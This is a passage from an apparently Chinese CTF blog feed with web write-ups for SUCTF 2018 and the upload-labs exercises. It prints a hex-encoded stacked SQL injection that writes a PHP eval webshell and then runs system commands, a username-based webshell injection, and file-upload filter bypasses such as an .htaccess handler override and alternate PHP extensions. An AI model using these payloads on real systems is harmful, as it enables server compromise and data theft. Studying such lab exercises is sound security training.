class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">"@@"</span>,$str);</span><br><span class="line"><span class="keyword">return</span> addslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>user/user.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../bwvs_config/sys_config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'user_name'</span>])) &#123;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../header.php'</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($SESSION[<span class="string">'user_id'</span>])) &#123;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM dwvs_user_message WHERE DWVS_user_name ="</span>.<span class="string">"'&#123;$_SESSION['user_name']&#125;'"</span>;</span><br><span class="line">$data = mysqli_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Mysql Error!!'</span>);</span><br><span class="line">$result = mysqli_fetch_array($data);</span><br><span class="line">$_SESSION[<span class="string">'user_id'</span>] = $result[<span class="string">'DWVS_user_id'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$html_avatar = htmlspecialchars($_SESSION[<span class="string">'user_favicon'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">$id=waf($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM dwvs_user_message WHERE DWVS_user_id ="</span>.$id;</span><br><span class="line">$data = mysqli_multi_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">$result = mysqli_store_result($connect);</span><br><span class="line">$row = mysqli_fetch_row($result);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;user_id:'</span>.$row[<span class="number">0</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:"</span>.$row[<span class="number">1</span>].<span class="string">"&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;æ³¨åæ¶é´ï¼"</span>.$row[<span class="number">4</span>].<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line">mysqli_free_result($result);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($connect);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class="row"&gt;</span><br><span class="line">&lt;div style=<span class="string">"float:left;"</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">"&lt;?php echo $html_avatar?&gt;"</span> width=</span><br></pre></td></tr></table></figure><p>发现user.php查询id是用<code>mysqli_multi_query</code>，可以执行多条sql语句</p><p>既然waf函数过滤了select，可以用set跟hex编码的方式执行SQL语句，绕过过滤函数 </p><blockquote><p>set @sql = concat(‘create table ‘,newT,’ like ‘,old); </p><p> prepare s1 from @sql;  </p><p>execute s1; </p></blockquote><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.190.128:32771/user/user.php?id=22727;set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.190.128:32771/favicon/wfox.php?55332=system(%27cat%20../../../../WelL_Th1s_14_fl4g%27);</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/SUCTF2018.assets/1530876497015.png" alt="1530876497015"></p><p>姿势2</p><p><a href="http://www.bendawang.site/2018/05/28/SUCTF-2018-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">http://www.bendawang.site/2018/05/28/SUCTF-2018-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</a></p><p>先注册一个用户名为:<code>&lt;?php eval($_POST[bdw]);?&gt;</code>,</p><p>在注册一个用户名为:<code>&lt;?php eval($_POST[bdw]);?&gt;&#39; into outfile &#39;/var/www/html/favicon/bdw.php&#39;#</code></p><p>登录第二个用户就写入了shell，然后可以反弹shell，也可以</p><blockquote><p>SUCTF{web_fake_flag_e} </p></blockquote><p>参考链接：</p><p>load_file()和into outfile：<a href="http://wyb0.com/posts/injection-of-mysql-function/" target="_blank" rel="noopener">http://wyb0.com/posts/injection-of-mysql-function/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;annonymous&quot;&gt;&lt;a href=&quot;#annonymous&quot; class=&quot;headerlink&quot; title=&quot;annonymous&quot;&gt;&lt;/a&gt;annonymous&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$MY = create_function(&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;die(`cat flag.php`);&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$hash = bin2hex(openssl_random_pseudo_bytes(&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;eval&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;function SUCTF_$hash()&amp;#123;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .&lt;span class=&quot;string&quot;&gt;&quot;global \$MY;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .&lt;span class=&quot;string&quot;&gt;&quot;\$MY();&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .&lt;span class=&quot;string&quot;&gt;&quot;&amp;#125;&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;func_name&#39;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $_GET[&lt;span class=&quot;string&quot;&gt;&quot;func_name&quot;&lt;/span&gt;]();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;show_source(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
      <category term="web" scheme="http://blog.Lhaihai.wang/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs</title>
    <link href="http://blog.Lhaihai.wang/2018/07/04/upload-labs/"/>
    <id>http://blog.Lhaihai.wang/2018/07/04/upload-labs/</id>
    <published>2018-07-04T10:46:56.000Z</published>
    <updated>2018-07-04T12:29:08.103Z</updated>
    
    <content type="html"><![CDATA[<p>c0ny1师傅写的upload-labs，受益良多</p><a id="more"></a><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0writeup.assets/mind-map.png" alt="img"> </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0writeup.assets/sum_up.png" alt=""> </p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h4><p>禁用JS代码，</p><p>firefox插件： NoScript</p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>move_uploaded_file — 将上传的文件移动到新位置 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool move_uploaded_file ( string $filename , string $destination )</span><br></pre></td></tr></table></figure><p>本函数检查并确保由 <code>filename</code> 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由<code>destination</code> 指定的文件。</p><p>这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话。</p><h4 id="pass-1"><a href="#pass-1" class="headerlink" title="pass"></a>pass</h4><p>验证Content-Type：</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0writeup.assets/1530596607345.png" alt="1530596607345"></p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR. <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                 $img_path = $UPLOAD_ADDR .<span class="string">'/'</span>. $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。 </p><p>在线运行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_name=<span class="string">'15.png::$DATA'</span>;</span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">echo</span> $file_ext;</span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="keyword">echo</span> $file_ext;</span><br><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="keyword">echo</span> $file_ext;</span><br><span class="line">$file_ext = trim($file_ext);</span><br><span class="line"><span class="keyword">echo</span> $file_ext;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.png::$DATA</span><br><span class="line">.png::$data</span><br><span class="line">.png</span><br><span class="line">.png</span><br></pre></td></tr></table></figure><h4 id="pass-2"><a href="#pass-2" class="headerlink" title="pass"></a>pass</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"cimer"</span>&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd一php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>通过.htaccess文件，调用php的解析器解析一个文件名只要包含“cimer”这个字符串的任意文件。这个“cimer”的内容如果是一句话木马.即可利用中国莱刀进行连接。 </p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-3"><a href="#pass-3" class="headerlink" title="pass"></a>pass</h4><p>pht后缀</p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-4"><a href="#pass-4" class="headerlink" 